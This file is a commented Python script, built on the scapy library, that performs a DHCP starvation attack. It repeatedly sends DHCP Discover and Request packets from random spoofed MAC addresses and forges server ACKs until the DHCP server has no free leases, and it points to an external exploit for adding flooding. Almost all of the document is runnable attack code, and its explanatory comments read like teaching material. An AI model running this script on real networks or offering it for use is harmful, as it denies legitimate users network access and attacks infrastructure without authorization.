import socket
from scapy.all import *
"""
These lines import necessary modules for the script. socket is a built-in module for low-level network programming, 
and scapy is a powerful library for packet manipulation and network scanning.
You must install scapy by the command:
pip install scapy
If your system don't have pip command use the instructions in this link:
https://www.tecmint.com/install-pip-in-linux/
Or use this commands for centos stream 9
yum install epel-release
yum install python3-pip
This program works only as root user. use "sudo" or "sudo su" command, with the command python3 2.py or python3 <file>.
The program tested on centos stream 9, the program run only on linux systems.
"""


# This function constructs and sends a DHCP Discover packet to discover available DHCP servers.

def send_dhcp_discover(interface, mac):
    # Construct an Ethernet frame to broadcast the DHCP Discover message
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)
    # Create IP header for the packet
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    # Create UDP header for DHCP communication
    udp = UDP(sport=68, dport=67)
    # Create BOOTP header for DHCP
    bootp = BOOTP(op=1, chaddr=mac2str(mac))
    # Create DHCP header for Discover message
    dhcp = DHCP(options=[("message-type", "discover"), "end"])

    # Combine the headers to form the DHCP Discover packet
    packet = ether / ip / udp / bootp / dhcp
    # Send the packet on the specified network interface
    sendp(packet, iface=interface)

# This function constructs and sends a DHCP Request packet to request a specific IP address from a DHCP server.
def send_dhcp_request(interface, mac, offered_ip, server_ip, xid):
    # Construct an Ethernet frame to broadcast the DHCP Request message
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)
    # Create IP header for the packet
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    # Create UDP header for DHCP communication
    udp = UDP(sport=68, dport=67)
    # Create BOOTP header for DHCP
    bootp = BOOTP(op=1, chaddr=mac2str(mac), xid=xid)
    # Create DHCP header for Request message
    dhcp = DHCP(options=[("message-type", "request"),
                         ("requested_addr", offered_ip),
                         ("server_id", server_ip),
                         "end"])

    # Combine the headers to form the DHCP Request packet
    packet = ether / ip / udp / bootp / dhcp
    # Send the packet on the specified network interface
    sendp(packet, iface=interface)


# This function constructs and sends a DHCP ACK packet to acknowledge the lease of a specific IP address to a client.
def send_dhcp_ack(interface, client_mac, client_ip, server_ip, xid):
    # Construct an Ethernet frame to send the DHCP ACK message
    ether = Ether(dst=client_mac, src=RandMAC())
    # Create IP header for the packet
    ip = IP(src=server_ip, dst=client_ip)
    # Create UDP header for DHCP communication
    udp = UDP(sport=67, dport=68)
    # Create BOOTP header for DHCP
    bootp = BOOTP(op=2, chaddr=mac2str(client_mac), xid=xid, yiaddr=client_ip)
    # Create DHCP header for ACK message
    dhcp = DHCP(options=[("message-type", "ack"),
                         ("server_id", server_ip),
                         "end"])

    # Combine the headers to form the DHCP ACK packet
    packet = ether / ip / udp / bootp / dhcp
    # Send the packet on the specified network interface
    sendp(packet, iface=interface)


"""
The main() function is the entry point of the script. It retrieves a list of available network interfaces, 
prompts the user to select an interface, and then simulates a DHCP handshake process 
(Discover, Offer, Request, and Acknowledge) to lease an IP address. 
The script will continue this process until it successfully obtains all IP address from the server 
or determines that there's no free lease available.
This program doesn't continue to flood the server with DHCP Discover requests, for me it was enough here.
You can add this to the program by this code:
https://github.com/kavishkagihan/DHCP-Starvation-Attack/blob/main/exploit.py
At the sniffing point of the program, instead the break line.
"""
def main():
    # Make a list variable for available network interfaces
    interfaces = []
    """
    Retrieve a list of available network interfaces by appending the names from the tuples that 
    socket.if_nameindex() function make.
    """
    for interface in socket.if_nameindex():
        interfaces.append(interface[1])
    # Check if there is no available network interfaces
    if not interfaces:
        print("There is no available network interfaces, exiting...")
        return
    else:
        # Print the list of available network interfaces
        print("Available network interfaces:")
        """
        A loop that run on the index and names of the interfaces list that
        enumerate(interfaces, start=1) function make from the original interfaces list
        you can read more about enumerate function here:
        https://www.geeksforgeeks.org/enumerate-in-python/
        """
        for i, interface in enumerate(interfaces, start=1):
            print(f"{i}. {interface}")

        try:
            # Prompt the user to select a network interface
            choice = int(input("Select an interface (enter the number): "))
            if 1 <= choice <= len(interfaces):
                # Get the selected network interface
                selected_interface = interfaces[choice - 1]
            else:
                # Handle invalid choice
                print("Invalid choice. Please select a valid interface number.")
                return
        except ValueError:
            # Handle invalid input
            print("Invalid input. Please enter a valid number.")
            return

        # Print the selected network interface
        print(f"You selected: {selected_interface}")
    while True:
        # Generate a random MAC address for the client
        client_mac = RandMAC()

        # Send a DHCP Discover message
        try:
            send_dhcp_discover(selected_interface, client_mac)
        # Print error message in case the user is not root user
        except PermissionError:
            print("ERROR: The program must run with root privileges")
            break

        try:
            # Sniff for DHCP offer packets within a specified timeout
            offer_packet = sniff(filter="udp and port 67 and port 68", iface=selected_interface, timeout=10, count=1)[0]
            # Extract relevant information from the offer packet
            xid = offer_packet[BOOTP].xid
            offered_ip = offer_packet[BOOTP].yiaddr
            server_ip = offer_packet[IP].src

            """
            Check if the offered IP is 0.0.0.0, indicating no free lease available.
            If you want to use this option you have to remove timeout option from the offer_packet sniffing line
            It can take more time to the program to finish. just wait.
            """

            if offered_ip == "0.0.0.0":
                print("Attack finished there is no free lease available")
                break
        except IndexError:
            # Handle the case when no DHCP offer is received
            print("10 seconds passed without an offer, there is no DHCP server available or no free lease available")
            print("Attack finished")
            break

        # Send a DHCP Request message
        send_dhcp_request(selected_interface, client_mac, offered_ip, server_ip, xid)

        # Send a DHCP ACK message
        send_dhcp_ack(selected_interface, client_mac, offered_ip, server_ip, xid)
        # Print the leased IP address
        print(f"Leased IP address: {offered_ip}")

# Check if this script is executed as the main program
if __name__ == "__main__":
    # Call the main function
    main()